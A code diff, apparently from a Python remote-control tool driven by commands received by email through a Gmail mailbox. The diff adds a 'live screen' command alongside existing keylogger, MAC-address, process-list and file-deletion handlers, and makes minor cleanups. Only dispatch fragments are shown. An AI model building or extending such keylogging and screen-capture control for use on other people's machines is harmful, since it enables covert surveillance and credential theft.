@@ -97,6 +97,9 @@ def Process(Subject,rawMsg):
     elif Subject.lower() == "get list application" or rawMsg[:-2] == "get list application":
         filename = get_list_app()
         res = ["2",filename]
+    elif Subject.lower() == "live screen" or rawMsg[:-2] == "live screen":
+        filename = live_screen()
+        res = ["2",filename]
     elif Subject.lower() == "keylogger":
         res = kl.RunKeylogger(rawMsg)
     elif Subject.lower() == "get_mac_address":
@@ -267,7 +270,7 @@ def getListProcess():
         processes.append(proc.info)
     file_name = f"process_list_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
     # Write list of processes with ID and status to a text file
-    with open(file_name, 'w', encoding='utf-8') as f:
+    with open(file_name, 'w') as f:
         for proc in processes:
             f.write(f"PID: {proc['pid']}, Name: {proc['name']}, Status: {proc['status']}\n")
 
@@ -356,8 +359,6 @@ def delFile(msg):
         return 0
        
 
-
-
 def main(): 
     authorize()
     beginWatchMailBox()
@@ -376,5 +377,4 @@ def receiveGmailNotification():
     
 if __name__ == '__main__':
     main()
-    app.run(debug=True, host='localhost', port=3333)
    
